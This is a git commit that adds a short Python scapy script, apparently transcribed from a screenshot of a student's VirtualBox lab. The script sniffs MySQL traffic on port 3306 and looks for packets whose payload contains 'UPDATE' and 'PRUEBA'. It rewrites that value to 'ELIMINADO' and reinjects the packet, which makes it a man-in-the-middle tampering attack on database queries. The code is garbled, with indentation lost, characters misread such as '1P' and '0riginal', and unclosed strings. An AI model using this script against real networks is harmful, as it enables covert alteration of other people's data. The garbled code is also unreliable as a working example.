76ba71dfa50f40268fd3819b314c60382bab8440
lapinkyfloyd <alexa.galaz_b@mail.udp.cl>
2025-07-06 18:40:38 -0400

    Add files via upload

---
+++ modificar_trafico.py
@@ -0,0 +1,28 @@
+ict alexa@alexa-VirtualBox: ~ Qis -
+
+from scapy.all import sniff, IP, TCP, Raw, send
+
+def interceptar(pkt):
+if pkt.haslayer(Raw):
+carga = pkt[Raw].load
+
+if b"UPDATE" in carga and b"PRUEBA" in carga:
+print("\n[!] Paquete capturado con UPDATE
+print(f"0riginal: {carga}")
+
+nueva_carga = carga.replace(b'PRUEBA', b'ELIMINADO' )
+
+pkt_modificado = pkt.copy()
+pkt_modificado[Raw].load = nueva_carga
+
+del pkt_modificado[IP].len
+del pkt_modificado[1P].chksum
+del pkt_modificado[TCP] .chksum
+
+send(pkt_modificado)
+print(f"[+] Modificado y enviado: {nueva_carga.decode(errors='ignore')}")
+
+iface = "br-de64afa7851c"
+
+print("[*] Escuchando en puerto 3306...
+sniff(iface=iface, filter="tcp port 3306", prn=interceptar, store=0)
